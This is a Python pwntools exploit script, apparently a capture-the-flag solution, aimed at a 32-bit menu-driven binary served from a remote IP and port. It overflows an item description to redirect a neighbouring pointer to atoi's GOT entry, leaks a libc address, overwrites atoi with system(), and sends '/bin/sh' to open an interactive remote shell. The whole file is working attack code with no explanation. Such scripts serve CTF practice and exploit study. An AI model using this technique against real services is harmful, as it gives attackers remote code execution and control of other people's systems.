```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
binfile = './sm'
#context.log_level = 'debug'
libcdir = '/lib/libc32/'
libcfile = libcdir + './libc.so'
ldfile = libcdir + './elf/ld.so'
#p = process([ldfile,'--library-path',libcdir,binfile])
p = remote("49.4.23.162",32149)
libc = ELF("./libc6-i386_2.23-0ubuntu9_amd64.so")
#libc = ELF(libcfile)
def sla(a,b):
    p.sendlineafter(b,a)
def sa(a,b):
    p.sendafter(b,a)
def ru(s):
    return p.recvuntil(s)
def opt(i):
    sla(str(i),'>>')
def add(name,price,size,desc):
    opt(1)
    sla(name,"name:")
    sla(str(price),"price:")
    sla(str(size),"size:")
    sla(desc,"tion:")
def edit(name,size,desc):
    opt(5)
    sla(name,'name:')
    sla(str(size),'size:')
    sla(desc,"tion:")
def list():
    opt(3)
    ru("below:")
    ru("des.")
    ru("des.")
    return ru("menu")
add("beta",20,240,"haha")
edit("beta",100,"haha")
add("gama",20,100,"gaga")
startG = 0x0804B038
atoiG = 0x0804B048
edit("beta",100,"A"*0x68+'gama\0'+'a'*11+p32(20)+p32(0x64)+p32(atoiG))
startA = u32(list()[:4])
print hex(startA)
systemAddr = startA - libc.symbols['atoi']+libc.symbols['system']
log.info("systemAddr : 0x%x"%systemAddr)
edit("gama",0x64,p32(systemAddr)+'\n')
#gdb.attach(p)
opt("/bin/sh\0")
p.interactive()
raw_input("# ")
```